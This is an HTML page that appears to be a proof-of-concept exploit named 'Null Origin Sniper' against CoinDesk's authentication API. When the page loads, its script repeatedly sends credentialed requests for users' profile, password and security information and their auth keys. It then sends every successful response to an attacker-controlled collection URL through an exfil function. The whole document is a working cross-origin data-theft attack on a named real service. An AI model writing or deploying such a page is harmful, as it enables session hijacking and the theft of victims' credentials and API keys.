<!DOCTYPE html>
<html>
<head>
    <title>CoinDesk Null Origin Sniper</title>
    <style>
        body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
        pre { background:#161b22; padding:15px; border:1px solid #30363d; white-space:pre-wrap; overflow:auto; }
    </style>
</head>
<body>
    <pre id="log">Null Origin Sniper v2 Started...\nMonitoring for authenticated sessions...\n</pre>

    <script>
        const ATTACKER = "http://127.0.0.1:5000/collect";   // Change to your oast.fun if needed

        function log(msg, color = "#c9d1d9") {
            const time = new Date().toLocaleTimeString();
            document.getElementById('log').textContent += `[${time}] ${msg}\n`;
        }

        const targets = [
            {
                name: "User Profile",
                method: "POST",
                url: "https://auth-api.coindesk.com/cryptopian/get",
                payload: { user_info_sections: ["pass", "security_info", "general"] }
            },
            {
                name: "Auth Keys (GET)",
                method: "GET",
                url: "https://auth-api.coindesk.com/stats/calls/auth/keys",
                payload: null
            },
            {
                name: "Auth Keys (POST)",
                method: "POST",
                url: "https://auth-api.coindesk.com/cryptopian/list/auth/keys",
                payload: {}
            }
        ];

        function exfil(data, name) {
            fetch(ATTACKER, {
                method: "POST",
                body: JSON.stringify({ type: name, data: data, ts: Date.now() })
            }).catch(() => {});
        }

        function startSniper() {
            targets.forEach(target => {
                setInterval(() => {
                    log(`→ Trying ${target.name}...`, "#ffa657");

                    const options = {
                        method: target.method,
                        credentials: "include",
                        headers: { "Content-Type": "application/json" }
                    };

                    if (target.method === "POST" && target.payload) {
                        options.body = JSON.stringify(target.payload);
                    }

                    fetch(target.url, options)
                    .then(r => r.json())
                    .then(data => {
                        if (data.Response === "Success" || data.keys_data || data.total_calls !== undefined) {
                            log(`✅ ${target.name} SUCCESS!`, "#7ee787");
                            console.log(data);
                            exfil(data, target.name);
                        }
                    })
                    .catch(() => log(`Failed ${target.name}`, "#f85149"));
                }, 3800);
            });
        }

        window.onload = startSniper;
    </script>
</body>
</html>
